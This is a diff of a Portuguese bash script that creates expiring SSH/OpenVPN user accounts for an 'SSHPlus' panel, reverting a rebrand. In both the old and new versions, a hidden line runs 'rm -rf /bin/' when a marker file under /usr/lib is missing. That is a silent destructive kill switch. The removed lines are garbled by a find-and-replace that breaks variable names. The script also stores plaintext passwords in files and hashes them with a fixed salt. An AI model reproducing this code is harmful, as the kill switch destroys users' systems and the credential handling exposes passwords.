@@ -34,7 +34,7 @@ if [[ -e /etc/openvpn/server.conf ]]; then
   rmt=$(sed -n '7 p' /etc/openvpn/client-common.txt)
   hedr=$(sed -n '8 p' /etc/openvpn/client-common.txt)
   prxy=$(sed -n '9 p' /etc/openvpn/client-common.txt)
-  rmt2='/INOVE SSH?'
+  rmt2='/SSHPLUS?'
   rmt3=$(cat /etc/IP)
   prx='200.142.130.104'
   vivo1="portalrecarga.vivo.com.br/recarga"
@@ -240,8 +240,8 @@ fun_edithost () {
     fun_edithost
   fi
 }
-[[ ! -e /usr/lib/INOVE SSH ]] && rm -rf /bin/ > /dev/null 2>&1
-tput setaf 7 ; tput setab 4 ; tput bold ; printf '%30s%s%-15s\n' "Criar usuário @henrysc10" ; tput sgr0
+[[ ! -e /usr/lib/sshplus ]] && rm -rf /bin/ > /dev/null 2>&1
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%30s%s%-15s\n' "Criar usuário SSH" ; tput sgr0
 echo ""
 echo -ne "\033[1;32mNome do usuário:\033[1;37m "; read username
 awk -F : ' { print $1 }' /etc/passwd > /tmp/users 
@@ -300,18 +300,18 @@ else
                     tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Você deve digitar um número de dias maior que zero!" ; echo "" ; tput sgr0
                     exit 1
                   else
-                      echo -ne "\033[1;32mLimite De Conexões:\033[1;37m "; read @henrysc10limiter
-                    if (echo $@henrysc10limiter | egrep '[^0-9]' &> /dev/null)
+                      echo -ne "\033[1;32mLimite De Conexões:\033[1;37m "; read sshlimiter
+                    if (echo $sshlimiter | egrep '[^0-9]' &> /dev/null)
                     then
                       tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Você digitou um número de conexões inválido!" ; echo "" ; tput sgr0
                       exit 1
                     else
-                      if [[ -z $@henrysc10limiter ]]
+                      if [[ -z $sshlimiter ]]
                       then
                         tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Você deixou o limite de conexões vazio!" ; echo "" ; tput sgr0
                         exit 1
                       else
-                        if [[ $@henrysc10limiter -lt 1 ]]
+                        if [[ $sshlimiter -lt 1 ]]
                         then
                           tput setaf 7 ; tput setab 4 ; tput bold ; echo "" ; echo "Número de conexões simultâneas deve ser maior que zero!" ; echo "" ; tput sgr0
                           exit 1
@@ -321,8 +321,8 @@ else
                           pass=$(perl -e 'print crypt($ARGV[0], "password")' $password)
                           sleep 0.5s
                           useradd -e $final -M -s /bin/false -p $pass $username
-                          echo "$password" > /etc/INOVE SSH/senha/$username
-                          echo "$username $@henrysc10limiter" >> /root/usuarios.db
+                          echo "$password" > /etc/SSHPlus/senha/$username
+                          echo "$username $sshlimiter" >> /root/usuarios.db
                           if [[ -e /etc/openvpn/server.conf ]]; then
                               echo -ne "\033[1;32mGerar Arquivo Ovpn \033[1;31m? \033[1;33m[s/n]:\033[1;37m "; read resp
                               if [[ "$resp" = @(s|S) ]]; then
@@ -341,8 +341,8 @@ else
                                   fi
                                 }
                                 clear
-                                echo -e "\E[44;1;37m       CONTA @henrysc10 CRIADA !      \E[0m"
-                                [ $? -eq 0 ] && tput setaf 2 ; tput bold ; echo ""; echo -e "\033[1;32mIP: \033[1;37m$IP" ; echo -e "\033[1;32mUsuário: \033[1;37m$username" ; echo -e "\033[1;32mSenha: \033[1;37m$password" ; echo -e "\033[1;32mExpira em: \033[1;37m$gui" ; echo -e "\033[1;32mLimite de conexões: \033[1;37m$@henrysc10limiter" ; echo "" || echo "Não foi possível criar o usuário!" ; tput sgr0
+                                echo -e "\E[44;1;37m       CONTA SSH CRIADA !      \E[0m"
+                                [ $? -eq 0 ] && tput setaf 2 ; tput bold ; echo ""; echo -e "\033[1;32mIP: \033[1;37m$IP" ; echo -e "\033[1;32mUsuário: \033[1;37m$username" ; echo -e "\033[1;32mSenha: \033[1;37m$password" ; echo -e "\033[1;32mExpira em: \033[1;37m$gui" ; echo -e "\033[1;32mLimite de conexões: \033[1;37m$sshlimiter" ; echo "" || echo "Não foi possível criar o usuário!" ; tput sgr0
                                 sleep 1
                                 function aguarde {
                                   helice () {
@@ -378,13 +378,13 @@ else
                                 fi
                               else
                                 clear
-                                echo -e "\E[44;1;37m       CONTA @henrysc10 CRIADA !      \E[0m"
-                                [ $? -eq 0 ] && tput setaf 2 ; tput bold ; echo ""; echo -e "\033[1;32mIP: \033[1;37m$IP" ; echo -e "\033[1;32mUsuário: \033[1;37m$username" ; echo -e "\033[1;32mSenha: \033[1;37m$password" ; echo -e "\033[1;32mExpira em: \033[1;37m$gui" ; echo -e "\033[1;32mLimite de conexões: \033[1;37m$@henrysc10limiter" ; echo "" || echo "Não foi possível criar o usuário!" ; tput sgr0
+                                echo -e "\E[44;1;37m       CONTA SSH CRIADA !      \E[0m"
+                                [ $? -eq 0 ] && tput setaf 2 ; tput bold ; echo ""; echo -e "\033[1;32mIP: \033[1;37m$IP" ; echo -e "\033[1;32mUsuário: \033[1;37m$username" ; echo -e "\033[1;32mSenha: \033[1;37m$password" ; echo -e "\033[1;32mExpira em: \033[1;37m$gui" ; echo -e "\033[1;32mLimite de conexões: \033[1;37m$sshlimiter" ; echo "" || echo "Não foi possível criar o usuário!" ; tput sgr0
                               fi
                           else
                             clear
-                            echo -e "\E[44;1;37m       CONTA @henrysc10 CRIADA !      \E[0m"
-                            [ $? -eq 0 ] && tput setaf 2 ; tput bold ; echo ""; echo -e "\033[1;32mIP: \033[1;37m$IP" ; echo -e "\033[1;32mUsuário: \033[1;37m$username" ; echo -e "\033[1;32mSenha: \033[1;37m$password" ; echo -e "\033[1;32mExpira em: \033[1;37m$gui" ; echo -e "\033[1;32mLimite de conexões: \033[1;37m$@henrysc10limiter" ; echo "" || echo "Não foi possível criar o usuário!" ; tput sgr0
+                            echo -e "\E[44;1;37m       CONTA SSH CRIADA !      \E[0m"
+                            [ $? -eq 0 ] && tput setaf 2 ; tput bold ; echo ""; echo -e "\033[1;32mIP: \033[1;37m$IP" ; echo -e "\033[1;32mUsuário: \033[1;37m$username" ; echo -e "\033[1;32mSenha: \033[1;37m$password" ; echo -e "\033[1;32mExpira em: \033[1;37m$gui" ; echo -e "\033[1;32mLimite de conexões: \033[1;37m$sshlimiter" ; echo "" || echo "Não foi possível criar o usuário!" ; tput sgr0
                           fi
                         fi
                       fi
